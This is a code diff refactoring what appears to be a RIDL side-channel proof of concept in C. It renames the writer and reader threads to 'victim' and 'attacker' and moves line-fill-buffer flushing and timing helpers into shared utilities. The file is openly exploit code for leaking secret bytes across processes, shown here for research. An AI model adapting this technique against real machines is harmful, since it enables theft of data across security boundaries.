@@ -1,38 +1,22 @@
 #include "../primitives/basic_primitives.h"
-#include <time.h>
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
-#include <unistd.h>
-#include <pthread.h>
-#include <sched.h>
 #include <signal.h>
+#include <unistd.h>
 #include <sys/mman.h>
+#include "utils.h"
 
-#define TIMES_TEN(X) X X X X X X X X X X
 
 #define REPS 200000
 #define WRITE_VALUE 42ull
 #define CYCLE_LENGTH 400000000
 
-int _page_size = 0x1000;
 
 int writer_cpu = 3, reader_cpu = 7, pid = 0;
 int hits[256];
 
-inline uint64_t time_convert(struct timespec *spec) { return (1000000000ull * (uint64_t) spec->tv_sec) + spec->tv_nsec; }
-
-inline void lfb_fill(uint64_t *address) {
-    uint64_t local;
-    TIMES_TEN( asm volatile(
-            "movq (%0), %1\n"
-            "mfence\n"
-            "xor %1, %1\n"
-            "clflush (%0)\n"
-    ::"r"(address), "r"(local));)
-}
-
-inline void *test_write(char *secret, int cycle_length) {
+inline void *victim(char *secret, int cycle_length) {
     set_processor_affinity(writer_cpu);
 
     int length = strlen(secret);
@@ -44,18 +28,18 @@ inline void *test_write(char *secret, int cycle_length) {
 
     for (int i = 0; i < length; i++) {
         t = time_convert(&spec);
-        destination[0] = (uint64_t)secret[i];
+        destination[0] = (uint64_t) secret[i];
         while (time_convert(&spec) - t < cycle_length) {
             int j = 1000;
-            while (j--) lfb_fill(destination);
+            while (j--) load_and_flush(destination);
             clock_gettime(CLOCK_REALTIME, &spec);
         }
     }
     destination[0] = 7;
-    while (1) { lfb_fill(destination); }
+    while (1) { load_and_flush(destination); }
 }
 
-void test_read(void *mem, int cycle_length) {
+void attacker(void *mem, int cycle_length) {
     set_processor_affinity(reader_cpu);
 
     struct timespec spec;
@@ -103,10 +87,10 @@ int main() {
     ridl_init();
     pid = fork();
     if (!pid) {
-        test_write(secret, CYCLE_LENGTH);
+        victim(secret, CYCLE_LENGTH);
         return 0;
     }
-    test_read(mem, CYCLE_LENGTH);
+    attacker(mem, CYCLE_LENGTH);
     kill(pid, SIGKILL);
     usleep(10000);
 
